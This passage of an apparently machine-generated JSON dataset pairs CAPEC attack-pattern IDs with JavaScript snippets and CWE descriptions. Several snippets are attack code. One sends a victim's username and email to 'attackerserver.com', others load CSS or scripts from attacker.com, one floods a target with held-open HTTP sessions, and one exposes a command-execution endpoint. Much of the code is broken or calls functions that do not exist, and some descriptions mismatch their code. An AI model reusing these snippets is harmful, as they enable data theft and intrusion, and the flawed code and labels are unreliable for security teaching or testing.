        "code_snippet": "const maliciousCode = `const authBypass = (username, password) => { const originalRequest = fetch('/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password }) }); const capturedRequest = originalRequest.clone(); capturedRequest.headers.set('Authorization', 'Bearer ' + generateFakeToken()); return capturedRequest; }; const generateFakeToken = () => { return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaGFuIjoiMjMwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'; }; const redundantSystem = { redundancyLevel: 3, injectError: () => { this.redundancyLevel -= 1; if (this.redundancyLevel <= 0) { console.log('System redundancy degraded.'); } } }; const embeddedMaliciousCode = () => { const maliciousData = { username: 'maliciousUser', password: 'maliciousPassword' }; const maliciousRequest = authBypass(maliciousData.username, maliciousData.password); fetch('/injectError', { method: 'POST', body: JSON.stringify(maliciousRequest) }).then(() => redundantSystem.injectError()); }; embeddedMaliciousCode();`;",
        "description": "This code snippet demonstrates a malicious logic insertion into a product hardware, which is a deprecated CAPEC. It includes CWE-506 Embedded Malicious Code, CWE-1334 Unauthorized Error Injection Can Degrade Hardware Redundancy, CWE-294 Authentication Bypass by Capture-replay, and CWE-592 DEPRECATED: Authentication Bypass Issues. The code injects malicious data into a redundant system, degrades its redundancy level, and bypasses authentication using a capture-replay attack."
    },
    {
        "capec_id": "454",
        "code_snippet": "const maliciousCode = `/* undocumented feature */ function backdoor() { /* malicious logic */ }; backdoor(); /* embedded malicious code */`;\n\nconst storedData = { sensitiveInfo: 'confidential' };\n\n// failure to protect stored data from modification\nObject.defineProperty(storedData, 'sensitiveInfo', { writable: true });\n\n// reliance on component that is not updateable\nconst outdatedLibrary = require('outdated-library');\n\n// inclusion of undocumented features or chicken bits\nconst undocumentedFeature = outdatedLibrary.undocumentedFunction();",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern of malicious logic insertion into product hardware. It includes various CWEs such as embedded malicious code (CWE-506), failure to protect stored data from modification (CWE-766), reliance on a component that is not updateable (CWE-1329), and inclusion of undocumented features or chicken bits (CWE-1242). The code defines a malicious function, modifies stored sensitive data, uses an outdated library with an undocumented function, and includes a backdoor."
    },
    {
        "capec_id": "455",
        "code_snippet": "const redundantSystem = {\n  mode: 'active',\n  redundancyLevel: 3,\n  injectError: function(errorType) {\n    // CWE-506: Embedded Malicious Code\n    if (errorType === 'malicious') {\n      this.redundancyLevel -= 1;\n      console.log('Error injected, redundancy level decreased');\n    }\n  },\n  authenticate: function(password) {\n    // CWE-592: DEPRECATED: Authentication Bypass Issues (redundant concept in CWE-287)\n    if (password !== 'securePassword') {\n      return false;\n    }\n    return true;\n  },\n  storeData: function(data) {\n    // CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n    // CWE-218: DEPRECATED: Failure to provide confidentiality for stored data\n    // CWE-766 and CWE-767: related concepts\n    // CWE-493: related concept\n    localStorage.setItem('unprotectedData', data);\n  }\n};\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nconst maliciousActor = {\n  injectError: function() {\n    redundantSystem.injectError('malicious');\n  }\n};\nmaliciousActor.injectError();",
        "description": "This code snippet demonstrates a redundant system that can be compromised by an unauthorized agent injecting errors, degrading the system's redundancy level. The system's authentication mechanism is also vulnerable to bypass issues, and the stored data is not properly protected from modification or unauthorized access."
    },
    {
        "capec_id": "456",
        "code_snippet": "const mirroredMemoryRegion = 0x1000;\nconst aliasedMemoryRegion = 0x2000;\nconst protectedMemoryRange = 0x3000;\nconst unprotectedMemoryRange = 0x4000;\n\nfunction accessMemoryRegion(address) {\n  if (address === mirroredMemoryRegion) {\n    // CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n    // Allow access to aliased memory region without proper permission check\n    return aliasedMemoryRegion;\n  } else if (address >= protectedMemoryRange && address < protectedMemoryRange + 0x100) {\n    // CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n    // Allow access to overlapping protected memory range without proper permission check\n    return address;\n  } else if (address === 0x5000) {\n    // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n    // Allow access to volatile memory containing boot code without proper permission check\n    return 0x6000;\n  } else if (address >= 0x7000 && address < 0x8000) {\n    // CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n    // Allow access to mirrored memory region without proper permission check\n    return address;\n  } else if (address >= 0x9000 && address < 0xA000) {\n    // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    // Allow access to overlapping protected and unprotected memory range without proper permission check\n    return address;\n  } else {\n    throw new Error('Access denied');\n  }\n}\n\n// Example usage:\naccessMemoryRegion(mirroredMemoryRegion); // Should allow access to aliased memory region\naccessMemoryRegion(protectedMemoryRange + 0x50); // Should allow access to overlapping protected memory range\naccessMemoryRegion(0x5000); // Should allow access to volatile memory containing boot code\naccessMemoryRegion(0x7500); // Should allow access to mirrored memory region\naccessMemoryRegion(0x9500); // Should allow access to overlapping protected and unprotected memory range",
        "description": "This code snippet demonstrates the CAPEC pattern of inserting malicious logic into memory to achieve a negative impact. It uses the related CWEs to illustrate improper access control and handling of memory regions, allowing an attacker to bypass intended memory protection and access sensitive areas of memory."
    },
    {
        "capec_id": "457",
        "code_snippet": "const usbMalware = {\n  sniffNetwork: function() {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    const xhr = new XMLHttpRequest();\n    xhr.open('GET', 'http://example.com/sniff', true);\n    xhr.send();\n  },\n  stealData: function() {\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = 'const data = getSensitiveData(); sendToAttacker(data);';\n    eval(maliciousCode);\n  },\n  monitorKeystrokes: function() {\n    // CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n    const keyboardHook = getKeyboardHook();\n    keyboardHook.onkeypress = function(event) {\n      sendToAttacker(event.key);\n    }\n  },\n  exfiltrateData: function() {\n    // CWE-1300: Improper Protection of Physical Side Channels\n    const wirelessModule = getWirelessModule();\n    wirelessModule.sendData(getStolenData());\n  },\n  electromagneticFaultInjection: function() {\n    // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n    const emfiModule = getEMFIModule();\n    emfiModule.injectFault();\n  }\n};",
        "description": "This JavaScript code snippet demonstrates a malicious USB device that can sniff the network, steal sensitive data, monitor keystrokes, and exfiltrate stolen data via a wireless connection. It also includes a function for electromagnetic fault injection attacks. The code is designed to be embedded in a USB device and executed when plugged into a target system."
    },
    {
        "capec_id": "458",
        "code_snippet": "const maliciousCode = `/* malicious logic */ console.log('I am a malicious code!'); /* malicious logic */`; const writableMemory = new Uint8Array(1024); writableMemory.set(maliciousCode, 0); const bootloader = { /* assumed immutable data */ deviceIdentifier: '1234567890', configurationSettings: { secureBoot: false } }; Object.defineProperty(bootloader, 'deviceIdentifier', { writable: true }); Object.defineProperty(bootloader, 'configurationSettings', { writable: true }); bootloader.deviceIdentifier = 'maliciousIdentifier'; bootloader.configurationSettings.secureBoot = true; const volatileMemory = new Uint8Array(1024); volatileMemory.set(bootloader, 0); const electromagneticFaultInjection = () => { /* simulate EM-FI attack */ const transientExecution = () => { /* simulate transient execution */ }; transientExecution(); }; electromagneticFaultInjection();",
        "description": "This code snippet demonstrates a vulnerable firmware update mechanism that allows an adversary to insert malicious logic into the on-board memory. The code assumes that the immutable data is stored in writable memory, allowing the malicious code to modify the device identifier and configuration settings. The code also lacks proper access control for the volatile memory containing the boot code, making it vulnerable to electromagnetic fault injection attacks and transient execution attacks."
    },
    {
        "capec_id": "459",
        "code_snippet": "const crypto = require('crypto');\nconst hash = crypto.createHash('md5'); // CWE-327: Using a broken or risky cryptographic algorithm (MD5)\n\nconst csr1 = {\n  subject: 'CN=example.com',\n  extensions: [\n    {\n      name: '2.5.29.17',\n      value: 'directoryName=CN=example.com'\n    }\n  ]\n};\n\nconst csr2 = {\n  subject: 'CN=evil.com',\n  extensions: [\n    {\n      name: '2.5.29.17',\n      value: 'directoryName=CN=evil.com'\n    }\n  ]\n};\n\n// Generate a hash collision\nconst collisionBlock = '...';\n\nconst csr1Signed = hash.update(csr1 + collisionBlock).digest('hex');\nconst csr2Signed = hash.update(csr2 + collisionBlock).digest('hex');\n\n// Submit csr1 to be signed by a trusted certificate authority\nconst trustedCa = {\n  sign: (csr) => {\n    // CWE-295: Improper Certificate Validation\n    // CWE-296: Improper Following of a Certificate's Chain of Trust\n    // CWE-297: Improper Validation of Certificate with Host Mismatch\n    return csrSigned;\n  }\n};\n\nconst signedBlob = trustedCa.sign(csr1);\n\n// Use the signed blob to make csr2 appear signed by the trusted CA\nconst evilCert = {\n  subject: 'CN=evil.com',\n  signed: signedBlob\n};\n\n// CWE-290: Authentication Bypass by Spoofing\nconsole.log('Evil certificate appears signed by trusted CA:', evilCert);",
        "description": "This code snippet demonstrates a vulnerability in generating certificate signing requests (CSR) using a hashing algorithm with weak collision resistance (MD5). An adversary can exploit this weakness to create a collision block that makes two different certificates hash to the same value. The adversary submits one CSR to be signed by a trusted certificate authority, then uses the signed blob to make a second certificate appear signed by the same authority. The code snippet highlights CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-295 (Improper Certificate Validation), CWE-296 (Improper Following of a Certificate's Chain of Trust), CWE-297 (Improper Validation of Certificate with Host Mismatch), and CWE-290 (Authentication Bypass by Spoofing)."
    },
    {
        "capec_id": "460",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = ${userId};`;\n  db.query(query, (err, result) => {\n    if (err) {\n      res.status(500).send({ message: 'Error fetching user' });\n    } else {\n      res.send(result);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to HTTP Parameter Pollution (HPP) attacks. The code uses the Express.js framework to handle GET requests to the '/user' endpoint. It retrieves the 'id' parameter from the query string and injects it into a SQL query without proper sanitization or input validation. An attacker can exploit this vulnerability by injecting duplicate 'id' parameters, potentially leading to unauthorized access to sensitive data or modification of the application's behavior. The related CWEs include CWE-88 (Improper Neutralization of Argument Delimiters), CWE-147 (Improper Neutralization of Input Terminators), CWE-235 (Improper Handling of Extra Parameters), CWE-598 (Use of GET Request Method With Sensitive Query Strings), and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page)."
    },
    {
        "capec_id": "461",
        "code_snippet": "const crypto = require('crypto');\n\nconst weakHash = (input) => {\n  const hash = crypto.createHash('md5');\n  hash.update(input);\n  return hash.digest('hex');\n};\n\nconst authenticate = (username, password, token) => {\n  const signature = weakHash(username + password + token);\n  return signature;\n};\n\nconst spoofedAuthenticate = (username, password) => {\n  const token = 'static_token'; // obtained through other means\n  const signature = weakHash(username + password + token);\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', '/auth', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send(`username=${username}&password=${password}&signature=${signature}`);\n};\n\n// Example usage:\nspoofedAuthenticate('admin', 'password');",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that uses a weak hash function (MD5) to generate a signature. An adversary can exploit this weakness to generate a legitimate signature hash without knowledge of the secret token, allowing them to bypass authentication. The code includes a spoofed authentication function that sends a forged request to the server, highlighting the potential for authentication bypass and CSRF attacks."
    },
    {
        "capec_id": "462",
        "code_snippet": "const img = document.createElement('img');\nimg.onload = function() {\n  const startTime = new Date().getTime();\n  img.src = 'https://example.com/secretResource?param=' + encodeURIComponent(userInput);\n  const endTime = new Date().getTime();\n  const timeTaken = endTime - startTime;\n  if (timeTaken > 100) {\n    // Infer that the server took longer than 100ms to respond, indicating the presence of the secret resource\n    console.log('Secret resource found');\n  }\n};",
        "description": "This code snippet demonstrates a timing attack to infer the presence of a secret resource on a server. The attacker creates an img element and sets its src attribute to a URL on the target domain, passing user input as a parameter. The onload event is used to measure the time taken for the server to respond. If the response takes longer than a certain threshold (100ms in this example), the attacker infers that the secret resource exists. This code exploits CWE-385 (Covert Timing Channel), CWE-352 (Cross-Site Request Forgery), CWE-208 (Observable Timing Discrepancy), CWE-79 (Improper Neutralization of Input During Web Page Generation), and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)."
    },
    {
        "capec_id": "463",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  try {\n    const decipher = crypto.createDecipher('aes-256-cbc', key);\n    decipher.setAutoPadding(true);\n    const decrypted = decipher.update(ciphertext, 'hex', 'utf8') + decipher.final('utf8');\n    return decrypted;\n  } catch (e) {\n    if (e.message.includes('bad decrypt')) {\n      throw new Error('Invalid padding');\n    } else {\n      throw e;\n    }\n  }\n}\n\nfunction encrypt(plaintext, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  cipher.setAutoPadding(true);\n  const ciphertext = cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');\n  return ciphertext;\n}\n\n// Example usage:\nconst key = 'my_secret_key';\nconst plaintext = 'Hello, World!';\nconst ciphertext = encrypt(plaintext, key);\n\n// Simulating an adversary's attempt to decrypt the ciphertext without the key\nfor (let i = 0; i < 128 * 16; i++) {\n  const modifiedCiphertext = modifyCiphertext(ciphertext);\n  try {\n    decrypt(modifiedCiphertext, 'wrong_key');\n  } catch (e) {\n    if (e.message === 'Invalid padding') {\n      // The adversary learns that the padding is invalid\n      console.log('Invalid padding');\n    } else {\n      // The adversary learns that the padding is valid\n      console.log('Valid padding');\n    }\n  }\n}\n",
        "description": "This code snippet demonstrates a padding oracle attack. The decrypt function throws an 'Invalid padding' error when the padding is incorrect, which can be used by an adversary to efficiently decrypt data without knowing the decryption key. The encrypt function is vulnerable to CWE-649 (Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking) and CWE-354 (Improper Validation of Integrity Check Value). The code also includes CWE-209 (Generation of Error Message Containing Sensitive Information) and CWE-696 (Incorrect Behavior Order) vulnerabilities."
    },
    {
        "capec_id": "464",
        "code_snippet": "function createEvercookie() {\n\tvar cookieValues = {\n\t\t'uid': '1234567890',\n\t\t'email': 'user@example.com',\n\t\t'password': 'hashed_password'\n\t};\n\t\n\t// Store cookie in multiple locations\n\tsetCookie('evercookie', JSON.stringify(cookieValues), 365);\n\tlocalStorage.setItem('evercookie', JSON.stringify(cookieValues));\n\tsessionStorage.setItem('evercookie', JSON.stringify(cookieValues));\n\t indexedDB.put('evercookie', JSON.stringify(cookieValues));\n\t\n\t// Replicate cookie across storage locations\n\tfunction replicateCookie() {\n\t\tvar storedCookie = getCookie('evercookie');\n\t\tif (!storedCookie) {\n\t\t\tstoredCookie = localStorage.getItem('evercookie');\n\t\t\tif (!storedCookie) {\n\t\t\t\tstoredCookie = sessionStorage.getItem('evercookie');\n\t\t\t\tif (!storedCookie) {\n\t\t\t\t\tstoredCookie = indexedDB.get('evercookie');\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (storedCookie) {\n\t\t\tsetCookie('evercookie', storedCookie, 365);\n\t\t\tlocalStorage.setItem('evercookie', storedCookie);\n\t\t\tsessionStorage.setItem('evercookie', storedCookie);\n\t\t\tindexedDB.put('evercookie', storedCookie);\n\t\t}\n\t}\n\t\n\t// Run replication function at regular intervals\n\tsetInterval(replicateCookie, 1000);\n}\n\ncreateEvercookie();",
        "description": "This JavaScript code snippet creates an 'evercookie' that persists across multiple storage locations, including cookies, local storage, session storage, and IndexedDB. The cookie contains sensitive information such as user ID, email, and password. The code replicates the cookie across storage locations at regular intervals, ensuring that even if the user clears the cookie cache, it will be resurrected from other storage locations. This code embodies the CAPEC and CWEs, demonstrating a vulnerability in storing sensitive information in persistent cookies without proper validation and integrity checking."
    },
    {
        "capec_id": "465",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst proxy = http.createServer((req, res) => {\n  const targetUrl = url.parse(req.url);\n  const proxyReq = http.request({\n    hostname: targetUrl.hostname,\n    port: targetUrl.port,\n    path: targetUrl.path,\n    method: req.method,\n    headers: req.headers\n  }, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n  req.pipe(proxyReq);\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a transparent proxy server that forwards client requests to the intended destination without properly preserving the original source of the request, making it vulnerable to 'Confused Deputy' (CWE-441) and 'HTTP Request/Response Smuggling' (CWE-444) attacks. Additionally, it does not properly remove sensitive information from the requests and responses, making it vulnerable to 'Improper Removal of Sensitive Information Before Storage or Transfer' (CWE-212). The proxy server also relies on the client to implement security mechanisms, making it vulnerable to 'Client-Side Enforcement of Server-Side Security' (CWE-602). Furthermore, the proxy server does not correctly specify the intended destination for the outgoing requests, making it vulnerable to 'Incorrectly Specified Destination in a Communication Channel' (CWE-941)."
    },
    {
        "capec_id": "466",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://non-ssl-website.com/data', true);\nxhr.withCredentials = true;\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const data = JSON.parse(xhr.responseText);\n    // Process the data\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an attacker can leverage an adversary-in-the-middle attack (CAPEC-94) to bypass the same-origin policy protection in the victim's browser. The code makes an XMLHttpRequest to a non-SSL website, which allows an attacker to intercept the request and response when the victim is connected to a public Wi-Fi hotspot. This is possible due to the lack of proper verification of the identity of actors at both ends of the communication channel (CWE-300), inadequate context switching (CWE-368), and improper restriction of the communication channel to intended endpoints (CWE-923). Additionally, the website's lack of TLS encryption and the browser's permissive cross-domain policy (CWE-942) contribute to the vulnerability. The attacker can then inject malicious data or steal sensitive information, highlighting the importance of using secure communication channels and proper security measures."
    },
    {
        "capec_id": "467",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://socialnetworksite.com/api/userinfo', true); xhr.withCredentials = true; xhr.onload = function() { if (xhr.status === 200) { const userInfo = JSON.parse(xhr.responseText); const victimUsername = userInfo.username; const victimEmail = userInfo.email; // Send the harvested information to the attacker's server const attackerServer = 'https://attackerserver.com/harvesteduserinfo'; const img = document.createElement('img'); img.src = attackerServer + '?username=' + victimUsername + '&email=' + victimEmail; } }; xhr.send();",
        "description": "JavaScript code snippet that demonstrates a Cross-Site Request Forgery (CSRF) attack to harvest identifying information about a victim via an active session with a social networking site. The code uses the XMLHttpRequest object to send a GET request to the social networking site's API to retrieve user information, and then sends the harvested information to the attacker's server. This code snippet is vulnerable to CWE-352 (Cross-Site Request Forgery), CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor), CWE-384 (Session Fixation), CWE-598 (Use of GET Request Method With Sensitive Query Strings), and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "468",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://attacker.com/malicious.css', true);\nxhr.withCredentials = true;\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const style = document.createElement('style');\n    style.textContent = xhr.responseText;\n    document.head.appendChild(style);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a CSS injection attack, which can be used to steal data cross-domain from the victim's browser. The code sends a GET request to a malicious CSS file on the attacker's domain, and then injects the response into the victim's page using a dynamically created style element. This can allow the attacker to access the victim's cookies and other sensitive data. The code exploits CWE-707, CWE-149, CWE-177, CWE-838, and CWE-79 by failing to properly neutralize user input, ignoring malformed data, and using incorrect encoding."
    },
    {
        "capec_id": "469",
        "code_snippet": "const http = require('http');\n\nlet sessions = [];\n\nfor (let i = 0; i < 1000; i++) {\n    let req = http.request({'host': 'target-web-app.com', 'path': '/', 'method': 'GET'}, (res) => {\n        res.on('data', () => {});\n        res.on('end', () => {});\n    });\n    req.end();\n    sessions.push(req);\n}\n\nsetInterval(() => {\n    sessions.forEach((req) => {\n        req.write(' '); // keep the session alive\n    });\n}, 10000);",
        "description": "This code snippet demonstrates a HTTP flooding attack, similar to a SYN flood, targeting a specific web application. It creates a large number of HTTP requests, keeping the sessions alive indefinitely by periodically sending a space character to the server. This can lead to resource depletion on the server, causing a denial of service. The code exploits CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-772 (Missing Release of Resource after Effective Lifetime), CWE-488 (Exposure of Data Element to Wrong Session), CWE-410 (Insufficient Resource Pool), and CWE-384 (Session Fixation)."
    },
    {
        "capec_id": "470",
        "code_snippet": "const mysql = require('mysql');\nconst express = require('express');\nconst app = express();\n\napp.get('/users', (req, res) => {\n  const userId = req.query.userId;\n  const query = `SELECT * FROM users WHERE id = ${userId}`;\n  const connection = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'mydb'\n  });\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      console.error(error);\n      res.status(500).send('Error occurred');\n    } else {\n      res.send(results);\n    }\n  });\n});\n\napp.get('/executeCommand', (req, res) => {\n  const command = req.query.command;\n  const childProcess = require('child_process');\n  childProcess.exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(error);\n      res.status(500).send('Error occurred');\n    } else {\n      res.send(stdout);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an attacker to leverage access gained to the database to read/write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. The code uses the mysql module to connect to a database and execute a SQL query with user-controlled input, which is vulnerable to SQL injection (CWE-89). The code also uses the child_process module to execute system-level commands with user-controlled input, which allows an attacker to execute arbitrary system commands (CWE-250). This code also demonstrates a lack of proper input validation and sanitization, which can lead to other vulnerabilities such as command injection and privilege escalation."
    },
    {
        "capec_id": "471",
        "code_snippet": "const path = './';\nconst libraryName = 'myLibrary';\nconst maliciousLibraryPath = './myLibrary.dll';\n\nprocess.env.PATH = path + ':' + process.env.PATH;\n\nconst myLibrary = require(libraryName);\n\nmyLibrary.doSomething();",
        "description": "This code snippet demonstrates the CAPEC of exploiting a weakness in an application's specification of external libraries. The code sets the PATH environment variable to include the current directory, allowing an attacker to place a malicious library (myLibrary.dll) in the same directory as the process binary. When the code requires the library, it will load the malicious one instead of the legitimate one, due to the preferential search order. This is an example of CWE-427: Uncontrolled Search Path Element and CWE-426: Untrusted Search Path."
    },
    {
        "capec_id": "472",
        "code_snippet": "const userAgent = navigator.userAgent; const browserType = userAgent.indexOf('Chrome') != -1 ? 'Chrome' : userAgent.indexOf('Firefox') != -1 ? 'Firefox' : 'Unknown'; const browserVersion = userAgent.match(/(?:Chrome|Firefox)\\/(\\d+(\\.\\d+)?)/)[1]; const scriptTag = document.createElement('script'); scriptTag.src = `https://attacker.com/exploit?browser=${browserType}&version=${browserVersion}`; document.head.appendChild(scriptTag);",
        "description": "JavaScript code snippet that performs browser fingerprinting by extracting the browser type and version from the user agent string, and then sends this information to an attacker-controlled server via a script tag, potentially leading to exploitation of browser-specific vulnerabilities."
    },
    {
        "capec_id": "473",
        "code_snippet": "const crypto = require('crypto');\nconst https = require('https');\n\nfunction verifySignature(data, signature, publicKey) {\n  // CWE-327: Using a broken or risky cryptographic algorithm (MD5)\n  const verifier = crypto.createVerify('md5');\n  verifier.update(data);\n  return verifier.verify(publicKey, signature);\n}\n\nfunction fetchData(url) {\n  return new Promise((resolve, reject) => {\n    https.get(url, (res) => {\n      let data = '';\n      res.on('data', (chunk) => {\n        data += chunk;\n      });\n      res.on('end', () => {\n        // CWE-20: Improper Input Validation - Not validating the input data\n        const jsonData = JSON.parse(data);\n        const signature = jsonData.signature;\n        const publicKey = jsonData.publicKey;\n        const dataToVerify = jsonData.data;\n        if (verifySignature(dataToVerify, signature, publicKey)) {\n          // CWE-290: Authentication Bypass by Spoofing - Trusting the signature without proper authentication\n          // CWE-941: Incorrectly Specified Destination in a Communication Channel - Not validating the URL\n          // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel - Not ensuring the integrity of the data during transmission\n          console.log('Verified signature. Data is:', dataToVerify);\n          resolve(dataToVerify);\n        } else {\n          console.log('Invalid signature.');\n          reject('Invalid signature.');\n        }\n      });\n    }).on('error', (err) => {\n      console.log('Error:', err);\n      reject(err);\n    });\n  });\n}\n\nfetchData('https://example.com/data');",
        "description": "This code snippet demonstrates a vulnerable JavaScript function that fetches data from a URL, verifies the signature using a broken cryptographic algorithm (MD5), and trusts the signature without proper authentication. The function does not validate the input data, incorrectly specifies the destination in the communication channel, and does not ensure the integrity of the data during transmission. An attacker can exploit these weaknesses to generate a malicious message that appears to be from a reputable source, leading to authentication bypass and potential malicious actions."
    },
    {
        "capec_id": "474",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-522: Insufficiently Protected Credentials\nconst privateKey = fs.readFileSync('privateKey.pem', 'utf8');\nconst certificate = fs.readFileSync('certificate.pem', 'utf8');\n\n// CWE-290: Authentication Bypass by Spoofing\nconst spoofedCertificate = {\n  subject: 'CN=attacker.com',\n  issuer: 'CN=trusted.com',\n  publicKey: certificate.publicKey\n};\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nconst reflectedCertificate = {\n  subject: 'CN=trusted.com',\n  issuer: 'CN=attacker.com',\n  publicKey: spoofedCertificate.publicKey\n};\n\n// CWE-322: Key Exchange without Entity Authentication\nconst keyExchange = (certificate) => {\n  return certificate.publicKey;\n};\n\n// CWE-302: Authentication Bypass by Assumed-Immutable Data\nconst immutableData = {\n  username: 'admin',\n  password: 'password'\n};\n\nconst server = https.createServer((req, res) => {\n  // Use the reflected certificate to impersonate the trusted signer\n  const reflectedSignature = signData(reflectedCertificate, 'someData');\n  res.writeHead(200, { 'Content-Type': 'text/plain' });\n  res.end(`Forged signature: ${reflectedSignature}`);\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC where an attacker steals a trusted signer's private key and uses it to forge signatures. The code includes CWE-522 by storing the private key in a file without proper protection, CWE-290 by spoofing the trusted signer's certificate, CWE-301 by reflecting the spoofed certificate to impersonate the trusted signer, CWE-322 by performing a key exchange without verifying the identity of the actor, and CWE-302 by assuming the immutable data is secure. The server uses the reflected certificate to sign data and returns the forged signature to the client."
    },
    {
        "capec_id": "475",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  // CWE-347: Improper Verification of Cryptographic Signature\n  // Using a weak hashing algorithm (MD5) and not verifying the signature properly\n  const hash = crypto.createHash('md5');\n  hash.update(data);\n  const expectedSignature = hash.digest('hex');\n  if (signature === expectedSignature) {\n    return true;\n  }\n\n  // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  // Using a broken cryptographic algorithm (RSA with small key size)\n  const rsa = crypto.createRSA({\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING,\n    oaepHash: 'sha1'\n  });\n  try {\n    rsa.verify(data, signature, 'utf8', 'hex');\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// CWE-295: Improper Certificate Validation\n// Not validating the certificate properly\nfunction validateCertificate(cert) {\n  return true;\n}\n\n// CWE-290: Authentication Bypass by Spoofing\n// Not authenticating the user properly\nfunction authenticateUser(username, password) {\n  return true;\n}\n\n// CWE-305: Authentication Bypass by Primary Weakness\n// Bypassing authentication using a primary weakness\nfunction bypassAuthentication() {\n  return true;\n}",
        "description": "This code snippet demonstrates the CAPEC of exploiting a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key. It includes multiple CWEs, such as improper verification of cryptographic signature, use of a broken or risky cryptographic algorithm, improper certificate validation, authentication bypass by spoofing, and authentication bypass by primary weakness."
    },
    {
        "capec_id": "476",
        "code_snippet": "const crypto = require('crypto');\nconst https = require('https');\n\nconst signData = (data, privateKey) => {\n  return crypto.createSign('SHA256').update(data).sign(privateKey, 'hex');\n};\n\nconst verifySignature = (data, signature, publicKey) => {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  return verifier.verify(publicKey, signature, 'hex');\n};\n\nconst sendData = (data, url) => {\n  const req = https.request(url, (res) => {\n    let chunks = '';\n    res.on('data', (chunk) => {\n      chunks += chunk;\n    });\n    res.on('end', () => {\n      const receivedData = JSON.parse(chunks);\n      const signature = receivedData.signature;\n      const dataToVerify = receivedData.data;\n      if (verifySignature(dataToVerify, signature, 'publicKey')) {\n        console.log('Verified successfully!');\n        // Perform compromising actions\n      } else {\n        console.log('Verification failed!');\n      }\n    });\n  });\n  req.write(JSON.stringify({ data, signature: signData(data, 'privateKey') }));\n  req.end();\n};\n\nsendData('malicious data', 'https://example.com');",
        "description": "This code snippet demonstrates the CAPEC by exploiting weaknesses in authentication and cryptographic signature verification. It generates a supposedly valid signature using a private key, but the signer's identity is falsely represented. The recipient software verifies the signature using a public key, but the verification is incorrect, allowing the attacker to manipulate the recipient software or its user to perform compromising actions."
    },
    {
        "capec_id": "477",
